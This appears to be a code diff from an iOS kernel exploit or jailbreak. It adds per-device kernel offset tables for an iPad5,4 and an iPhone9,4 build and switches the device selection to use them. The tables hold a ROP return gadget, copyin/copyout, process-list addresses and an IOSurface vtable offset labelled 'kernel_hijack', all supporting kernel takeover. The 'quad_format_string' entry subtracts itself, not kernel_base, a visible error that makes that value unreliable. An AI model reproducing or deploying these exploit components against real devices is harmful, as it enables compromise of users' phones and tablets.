@@ -204,6 +204,60 @@ void init_iphone_6_14c92() {
     
 }
 
+void init_RELEASE_ARM64_T7001_1630_37893214() {
+    g_offsets.kernel_base = 0xfffffff006070000;
+    g_offsets.cachesize_callback = 0xfffffff0073be4a8 - g_offsets.kernel_base;
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base;
+    g_offsets.copyout = 0xfffffff00718fa48 - g_offsets.kernel_base;
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base;
+    g_offsets.ret_gadget = 0xfffffff006401da0 - g_offsets.kernel_base;
+    g_offsets.encode_frame_offset_ui32_width = (0xa10 + 0x4);
+    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base;
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base;
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.quad_format_string;
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base;
+    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base;
+    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base;
+    g_offsets.encode_frame_offset_keep_cache = (0x3b50);
+    g_offsets.osserializer_serialize = 0xfffffff00745b300 - g_offsets.kernel_base;
+    g_offsets.encode_frame_offset_iosurface_buffer_mgr = (0x11d8);
+    g_offsets.encode_frame_offset_ui32_height = (0xa10 + 0x8);
+    g_offsets.encode_frame_offset_slice_per_frame = (0xD58 + 0x30);
+    g_offsets.encode_frame_offset_chroma_format_idc = (0x3b70 + 0x28);
+    g_offsets.kernel_address_multipass_end_pass_counter_enc = (0xc);
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base;
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base;
+    g_offsets.copyin = 0xfffffff00718f840 - g_offsets.kernel_base;
+    g_offsets.iosurface_vtable_offset_kernel_hijack = (0x98);
+}
+
+void init_RELEASE_ARM64_T8010_1650_37895227() {
+    g_offsets.kernel_base = 0xfffffff005e1c000;
+    g_offsets.cachesize_callback = 0xfffffff0073ec9e0 - g_offsets.kernel_base;
+    g_offsets.l1dcachesize_handler = 0xfffffff007562370 - g_offsets.kernel_base;
+    g_offsets.copyout = 0xfffffff0071c6414 - g_offsets.kernel_base;
+    g_offsets.l1icachesize_string = 0xfffffff00704ba51 - g_offsets.kernel_base;
+    g_offsets.ret_gadget = 0xfffffff0063abf70 - g_offsets.kernel_base;
+    g_offsets.encode_frame_offset_ui32_width = (0xb58 + 0x4);
+    g_offsets.all_proc = 0xfffffff0075e66f0 - g_offsets.kernel_base;
+    g_offsets.panic = 0xfffffff0070ef8f8 - g_offsets.kernel_base;
+    g_offsets.quad_format_string = 0xfffffff00705dda2 - g_offsets.quad_format_string;
+    g_offsets.null_terminator = 0xfffffff00705e40f - g_offsets.kernel_base;
+    g_offsets.kern_proc = 0xfffffff0075ec0c8 - g_offsets.kernel_base;
+    g_offsets.iofence_vtable_offset = 0xfffffff006e495a0 - g_offsets.kernel_base;
+    g_offsets.encode_frame_offset_keep_cache = (0x383c);
+    g_offsets.osserializer_serialize = 0xfffffff007486530 - g_offsets.kernel_base;
+    g_offsets.encode_frame_offset_iosurface_buffer_mgr = (0x16b0);
+    g_offsets.encode_frame_offset_ui32_height = (0xb58 + 0x8);
+    g_offsets.encode_frame_offset_slice_per_frame = (0x37E8 + 0x34);
+    g_offsets.encode_frame_offset_chroma_format_idc = (0x37e8 + 0xac);
+    g_offsets.kernel_address_multipass_end_pass_counter_enc = (0xc);
+    g_offsets.sysctl_hw_family = 0xfffffff007562320 - g_offsets.kernel_base;
+    g_offsets.l1dcachesize_string = 0xfffffff00704ba5e - g_offsets.kernel_base;
+    g_offsets.copyin = 0xfffffff0071c6134 - g_offsets.kernel_base;
+    g_offsets.iosurface_vtable_offset_kernel_hijack = (0x98);
+}
+
 /*
  * Function name: 	offsets_get_os_build_version
  * Description:		Gets a string with the OS's build version.
@@ -288,26 +342,21 @@ kern_return_t offsets_determine_initializer_for_device_and_build(char * device, 
 	struct utsname u = { 0 };
     uname(&u);
 
-    printf("version: %s\n", u.version);
-    printf("machine: %s\n", u.machine);
+    DEBUG_LOG("version: %s", u.version);
+    DEBUG_LOG("machine: %s", u.machine);
 	
     kern_return_t ret = KERN_INVALID_HOST;
     
-    if (strstr(device, "iPhone7,2"))
-    {
-        DEBUG_LOG("Detected iPhone 6");
-        if (strstr(build, "14C92"))
-        {
-            DEBUG_LOG("Initializing for iOS 10.2");
-            *func = (init_func)init_iphone_6_14c92;
-            ret = KERN_SUCCESS;
-        }
-        else {
-            ERROR_LOG("Unsupported phone version. quitting.");
-            goto cleanup;
-        }
-    } else {
-        ERROR_LOG("Unsupported device. quitting.");
+   if (strstr(device, "iPad5,4")){
+		DEBUG_LOG("Initializing for iPad5,4");
+        *func = (init_func)init_RELEASE_ARM64_T7001_1630_37893214;
+        ret = KERN_SUCCESS;
+    }else if (strstr(device, "iPhone9,4")){
+		DEBUG_LOG("Initializing for iPhone9,4");
+        *func = (init_func)init_RELEASE_ARM64_T8010_1650_37895227;
+        ret = KERN_SUCCESS;
+    }else{
+        DEBUG_LOG("Unsupported device. quitting.");
         goto cleanup;
     }
     
